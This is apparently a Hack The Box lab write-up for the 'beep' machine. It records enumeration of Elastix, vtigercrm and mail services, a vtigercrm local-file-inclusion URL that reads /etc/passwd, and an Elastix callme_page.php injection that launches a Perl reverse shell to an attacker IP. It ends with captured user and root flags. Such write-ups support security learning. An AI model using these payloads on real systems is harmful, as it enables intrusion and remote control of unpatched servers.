# 10.10.10.7 - beep
## Linux machine with many ports open
### Web 80 and 443
- port 80 website redirects to an https website
	* Elastix login page.
- port 443 also redirects to this webpage
- robots.txt disallowed on /
	* Scanning not may not work

#### https://10.10.10.7/vtigercrm/
- vtigercrm found via gobuster 
	* version is 5.1.0


### Pop3 110 - Cyrus POP3 v2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 server
- Connect via telnet to pop3
	* admin is a valid user

### SMTP 25
- Connecter via telnet to smtp
- grabbed the banner 
```
220 beep.localdomain ESMTP Postfix
```
	* Add beep.localdomain to hosts file

### Port 10000 - MiniServ 1.570
- another login page
- Robots.txt disallowed on /

## BREAKTHROUGH
- LFI within the vtigercrm module is successful
	* POC Below
```
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```
- See if I can ping my own machine and then set the stage for a reverse shell
	* Was unable to find location of logs
	* Could not encode php file into base64
	* Giving up on the lfi to rce

## Elastix 2.2.0 RCE
- used svwar --> SIP Vicious
- Elastix is a PBX system that uses http and smtp to establish its services. Hint is the name of the box and the ports ope
	* Most likely pop3 and imap are rabbit holes to look like a mail server
```
svwar -e100-900 -m INVITE 10.10.10.7
```
- The command scans extentions 100-900 for active ones
- The request method is INVITE which is used to establish calls
	* more information about request methods can be found in wikipedia


```
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a1985%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.3:1985");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'
```
- The script itself needs to be edited to allow ssl negotiation using urllib
	* however I can bypass this simply by printing the concatinated url

### Initial foothold - User - aterisk
```
sh-3.2# cat user.txt
cat user.txt
aeff3def0c765c2677b94715cffa73ac
```

## Easy root - sudo -l
- multiple choices --> gtfo bins and GTFO
```
sh-3.2# cd /root
cd /root
sh-3.2# dir
dir
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
sh-3.2# cat root.txt
cat root.txt
d88e006123842106982acce0aaf453f0
sh-3.2# 

```
